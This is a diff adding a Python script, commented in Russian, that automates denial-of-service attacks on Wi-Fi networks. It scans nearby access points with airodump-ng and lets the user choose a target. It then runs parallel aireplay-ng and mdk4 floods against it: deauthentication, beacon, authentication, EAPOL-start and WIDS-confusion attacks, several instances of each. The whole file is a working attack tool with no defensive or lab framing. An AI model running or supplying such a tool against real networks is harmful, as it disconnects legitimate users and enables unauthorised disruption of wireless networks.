@@ -1,0 +1,210 @@
+import os
+import subprocess
+import signal
+import time
+import csv
+import sys
+import threading
+
+# Конфигурация
+ATTACK_INSTANCES = 3  # Количество экземпляров каждой атаки
+
+def monitor_mode_setup():
+    """Set up the Wi-Fi adapter in monitor mode using airmon-ng."""
+    os.system("sudo airmon-ng check kill")
+    interfaces = subprocess.getoutput("sudo airmon-ng").split("\n")
+    print("\n[INFO] Available Interfaces for Monitor Mode:")
+    for line in interfaces:
+        print(line)
+    interface = input("\nEnter the interface you want to put into monitor mode: ").strip()
+    if not interface:
+        print("[ERROR] No interface provided.")
+        sys.exit(1)
+    os.system(f"sudo airmon-ng start {interface}")
+
+    # Проверка нового интерфейса в режиме мониторинга
+    new_interfaces = subprocess.getoutput("iwconfig").split("\n")
+    monitor_interface = interface
+    for line in new_interfaces:
+        if "Mode:Monitor" in line:
+            monitor_interface = line.split()[0]
+            break
+
+    print(f"[INFO] {interface} is now in monitor mode as {monitor_interface}.")
+    return monitor_interface
+
+def get_network_list(monitor_interface):
+    """Run airodump-ng for 10 seconds, show a loading animation,
+    then parse CSV file with captured networks and display a static list."""
+    print("[INFO] Running airodump-ng for 10 seconds, please wait...")
+
+    # Удаляем старые результаты
+    os.system("sudo rm -f /tmp/airodump-01.csv /tmp/airodump-01.kismet.csv /tmp/airodump-01.kismet.netxml /tmp/airodump-01.log.csv")
+
+    # Запускаем airodump-ng с записью результатов в CSV
+    process = subprocess.Popen(
+        f"sudo airodump-ng {monitor_interface} --write /tmp/airodump --output-format csv --write-interval 1",
+        shell=True,
+        preexec_fn=os.setsid,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+    # Анимация ожидания 10 секунд
+    wait_time = 10
+    for i in range(wait_time):
+        sys.stdout.write(".")
+        sys.stdout.flush()
+        time.sleep(1)
+    print("\n[INFO] Stopping airodump-ng...")
+    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+    time.sleep(2)  # Небольшая пауза для корректного завершения и записи
+
+    csv_file = "/tmp/airodump-01.csv"
+    if not os.path.exists(csv_file):
+        print("[ERROR] Airodump-ng did not produce any output file.")
+        return None, None
+
+    # Читаем CSV-файл для списка сетей
+    networks = []
+    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+        reader = csv.reader(f)
+        for row in reader:
+            # Проверяем, что это строка с данными AP (а не заголовок или пустая)
+            if len(row) > 13 and row[0] not in ("BSSID", "") and row[0].count(":") == 5:
+                networks.append(row)
+
+    if not networks:
+        print("[INFO] No networks found. Try again.")
+        return None, None
+
+    # Удаляем дубликаты сетей по BSSID
+    unique_networks = {}
+    for net in networks:
+        bssid = net[0].strip()
+        channel = net[3].strip()
+        essid = net[13].strip()
+        unique_networks[bssid] = (channel, essid)
+
+    # Выводим список найденных сетей
+    print("\n[INFO] Networks found:")
+    print("Num | BSSID              | Channel | ESSID")
+    print("-------------------------------------------")
+    for i, (bssid, (channel, essid)) in enumerate(unique_networks.items(), start=1):
+        print(f"{i:>3} | {bssid:<18} | {channel:<7} | {essid}")
+
+    # Проверка наличия сетей
+    if not unique_networks:
+        print("[INFO] No networks found. Try again.")
+        return None, None
+
+    # Запрос выбора сети
+    while True:
+        choice = input("\nEnter the number of the target network: ").strip()
+        if not choice.isdigit():
+            print("[ERROR] Invalid choice. Please enter a number.")
+            continue
+
+        choice = int(choice)
+        if choice < 1 or choice > len(unique_networks):
+            print("[ERROR] Choice out of range. Please select a valid number.")
+            continue
+
+        break
+
+    # Получение BSSID и канала выбранной сети
+    selected_bssid = list(unique_networks.keys())[choice - 1]
+    selected_channel = unique_networks[selected_bssid][0]
+    print(f"[INFO] Selected Network - BSSID: {selected_bssid}, Channel: {selected_channel}")
+    return selected_bssid, selected_channel
+
+def run_attack_command(cmd):
+    """Run a single attack command."""
+    try:
+        subprocess.run(cmd, shell=True, preexec_fn=os.setsid)
+    except Exception as e:
+        print(f"[ERROR] An error occurred while running command: {cmd}\n{e}")
+
+def run_parallel_attacks(commands, instances=1):
+    """Run multiple instances of attack commands in parallel."""
+    processes = []
+    threads = []
+
+    for cmd in commands:
+        for i in range(instances):
+            print(f"[INFO] Starting attack: {cmd} | Instance: {i+1}/{instances}")
+            thread = threading.Thread(target=run_attack_command, args=(cmd,))
+            thread.start()
+            threads.append(thread)
+            processes.append(cmd)  # Хранение команд для остановки
+
+    return threads, processes
+
+def stop_attacks():
+    """Stop all running attack processes."""
+    try:
+        subprocess.run("sudo pkill -f 'aireplay-ng'", shell=True)
+        subprocess.run("sudo pkill -f 'mdk4'", shell=True)
+        print("[INFO] All attacks have been stopped.")
+    except Exception as e:
+        print(f"[ERROR] An error occurred while stopping attacks: {e}")
+
+def run_attacks(monitor_interface, bssid, channel):
+    """Run selected attacks on the target network with multiple instances."""
+    # Установка канала интерфейса
+    os.system(f"sudo iwconfig {monitor_interface} channel {channel}")
+    time.sleep(1)
+
+    # Определение команд атак
+    commands = [
+        # Мощный deauth flood по всем клиентам сети
+        f"sudo aireplay-ng --deauth 0 -a {bssid} {monitor_interface}",
+        
+        # Beacon flood с случайными ESSID (-s 1000), -g для генерации случайных ESSID
+        f"sudo mdk4 {monitor_interface} b -g -s 1000",
+        
+        # Auth DOS по BSSID со случайными MAC
+        f"sudo mdk4 {monitor_interface} a -a {bssid} -s",
+        
+        # Deauth flood через MDK4 со случайными MAC
+        f"sudo mdk4 {monitor_interface} d -B {bssid} -c {channel} -s",
+        
+        # EAPOL Start flood
+        f"sudo mdk4 {monitor_interface} e -t {bssid} -s",
+        
+        # WIDS Confusion
+        f"sudo mdk4 {monitor_interface} w -e {bssid} -c {channel} -s"
+    ]
+
+    # Запуск атак с заданным количеством экземпляров
+    threads, _ = run_parallel_attacks(commands, instances=ATTACK_INSTANCES)
+    print("[INFO] Attacks are running. Press Ctrl+C to stop them.")
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[INFO] Stopping all attacks...")
+        stop_attacks()
+        # Ожидание завершения потоков
+        for thread in threads:
+            thread.join()
+        print("[INFO] All attack threads have been terminated.")
+
+def main():
+    # Проверка поддержки адаптера
+    monitor_interface = monitor_mode_setup()
+    if not monitor_interface:
+        print("[ERROR] Failed to set up monitor mode.")
+        sys.exit(1)
+
+    bssid, channel = get_network_list(monitor_interface)
+    if bssid and channel:
+        run_attacks(monitor_interface, bssid, channel)
+    else:
+        print("[ERROR] Missing BSSID or channel information. Exiting.")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+
